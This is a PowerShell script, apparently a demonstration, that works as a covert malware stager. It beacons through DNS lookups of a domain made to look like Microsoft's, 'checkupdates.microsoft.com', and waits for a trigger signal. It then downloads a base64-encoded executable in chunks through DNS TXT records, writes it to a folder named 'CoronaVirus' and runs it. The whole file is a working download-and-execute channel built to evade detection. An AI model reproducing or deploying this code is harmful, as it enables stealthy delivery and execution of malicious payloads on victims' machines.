function get_last_octet
{
    # Get the last octate of DNS server 
    $dns = Resolve-DnsName -name checkupdates.microsoft.com | Format-List -Property IPAddress | Select-Object -first 3 | Out-String
    return $dns.Split(".")[3] -replace '\s',''
}
function getb64($number)
{
    # Get file segments in b64 by sending DNS TXT requests.
    $link = "$number.checkupdates.microsoft.com"
    $response = nslookup -type=TXT $link 2>$null
    $response = $response.split("""")
    $output = ""
    
    # Extract data from response.
    foreach ($line in $response)
    {
        if($line -ne "" -and $line -notlike "*Address*" -and $line -notlike "*Server*" -and $line -notlike "*microsoft*")
        {
            $output = "$output$line"
        }
    }
    # Remove whitespace.
    $output = $output -replace '\s',''
    # Check if this segment is last.
    if ($output[-1] -ne "^")
    {
        Add-Content $file_path $output -NoNewline
        return $false
    }
    else
    {
        $output = $output -replace '\^',''
        Add-Content $file_path $output -NoNewline
        return $true
    }
}


# First HeartBeat message
$original_last_octet = get_last_octet
$heart_beat = $true

# This loop sends HeartBeats until the last octet of the dns response changes.
while ($heart_beat)
{
    echo "HeartBeat"

    # Compare the new last octate with the original last octet
    $last_octet = get_last_octet
    if ($last_octet -ne $original_last_octet)
    {
        $heart_beat = $false
    }

    # Time between HBs.
    Start-Sleep -s 3
}

# For easy demonstration, the script creates the folder in c:\, yet its recomended to use %APPDATA% instead.
$parent_folder = "C:\CoronaVirus"
New-Item -Path "c:\" -Name "CoronaVirus" -ItemType "directory"

# text output file is to show the file while the data is being downloaded.
$file_path = "$parent_folder\output.txt"

# Remove file if exists
Remove-Item -Path $file_path
$end = $false
$num = 0
while (!$end)
{
    $end = getb64($num)
    echo $num
    $num+=1
}
$b64_data = Get-Content $file_path
$exe_file_path = "$parent_folder\file.exe"
[IO.File]::WriteAllBytes($exe_file_path, [Convert]::FromBase64String($b64_data))
start $exe_file_path
